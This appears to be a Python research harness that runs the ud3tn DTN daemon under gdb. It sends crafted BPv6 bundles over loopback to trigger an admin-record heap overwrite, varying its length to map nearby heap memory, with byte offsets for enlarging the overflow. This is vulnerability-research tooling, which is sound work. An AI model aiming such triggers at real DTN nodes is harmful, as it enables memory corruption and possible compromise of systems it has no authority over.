#!/usr/bin/env python3
"""Loopback-only gdb probe: vary the admin-record overwrite length and dump the
heap neighbourhood of the malloc(1) source-EID chunk. No off-loopback traffic.

Usage:
  python3 harness/gdb_probe.py --binary .../ud3tn-v0.15.1-plain/build/posix/ud3tn \
      --outdir .../probe --port 23224 --count 64 --marker 90 --hits 64
"""
import argparse
import os
import pathlib
import socket
import subprocess
import sys
import time

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from wire_trigger import make_bundle  # noqa: E402


def make_variable_bundle(marker, count, eid_len=0, seq=0):
    wire = bytearray(make_bundle(marker, count, eid_len))
    # wire_trigger.makes a 2-byte CBOR byte-string header for 91+count < 256;
    # prefix[84] is the BPv6 payload-block length SDNV (6 admin-header bytes
    # plus the chosen number of admin-record payload bytes); prefix[17] is the
    # one-byte creation-sequence SDNV.
    assert 6 + count < 128, "use a 2-byte SDNV for larger counts"
    assert seq < 128
    wire[2 + 84] = 6 + count
    wire[2 + 17] = seq
    return bytes(wire)

def make_large_bundle(marker, count, eid_len=0, seq=0):
    """Same vendor prefix, with a two-byte SDNV payload length for count >= 122."""
    from wire_trigger import PREFIX_HEX, cbor_byte_string_header, sdnv_encode
    prefix = bytearray.fromhex(PREFIX_HEX)
    assert len(prefix) == 91
    prefix[90] = eid_len
    prefix[17] = seq
    prefix[12:17] = sdnv_encode(int(time.time()))
    n = 6 + count
    assert 128 <= n < 16384
    prefix[84:85] = bytes([0x80 | (n >> 7), n & 0x7F])
    bundle = bytes(prefix) + bytes([marker]) * count
    return cbor_byte_string_header(len(bundle)) + bundle


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--port", type=int, default=23224)
    ap.add_argument("--marker", type=int, default=0x5A)
    ap.add_argument("--count", type=int, default=64)
    ap.add_argument("--hits", type=int, default=64)
    ap.add_argument("--eid-len", type=int, default=0)
    ap.add_argument("--pre", type=int, default=0, help="benign bundles before trigger")
    ap.add_argument("--pre-eid-len", type=int, default=8)
    ap.add_argument("--script", default=str(HERE / "heap_map.gdb"))
    ap.add_argument("--ld-preload")
    args = ap.parse_args()
    outdir = pathlib.Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    cmd = [
        "gdb", "-q", "-batch", "-ex", f"set $MAP_HITS={args.hits}",
        "-x", args.script, "--args", args.binary,
        "-b", "6", "-e", "dtn://ud3tn.dtn/",
        "-c", f"mtcp:127.0.0.1,{args.port}",
        "-s", str(outdir / "probe.aap.sock"),
        "-S", str(outdir / "probe.aap2.sock"),
        "-L", "4",
    ]
    env = dict(os.environ)
    if args.ld_preload:
        env["LD_PRELOAD"] = args.ld_preload
        env["MALLOC_LOG"] = str(outdir / "malloc.log")
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True, env=env)
    sent = False
    deadline = time.time() + 8

    def connect_send(payload):
        while time.time() < deadline:
            try:
                with socket.create_connection(("127.0.0.1", args.port),
                                              timeout=1) as s:
                    s.sendall(payload)
                return True
            except OSError:
                if proc.poll() is not None:
                    return False
                time.sleep(0.1)
        return False

    for i in range(args.pre):
        connect_send(make_variable_bundle(0x41, 64, args.pre_eid_len, seq=i + 1))
        time.sleep(0.15)
    builder = make_large_bundle if args.count >= 122 else make_variable_bundle
    sent = connect_send(builder(args.marker, args.count, args.eid_len, seq=127))
    try:
        out, _ = proc.communicate(timeout=40)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    log = outdir / f"map-{args.marker:02x}-n{args.count}-h{args.hits}.log"
    log.write_text(out)
    print(f"sent={sent} count={args.count} rc={proc.returncode} log={log}")
    for line in out.splitlines():
        if line.startswith("HEAPMAP") or "Breakpoint" in line \
                or line.startswith("0x") or "SIG" in line or "Error" in line:
            print("   ", line)


if __name__ == "__main__":
    main()
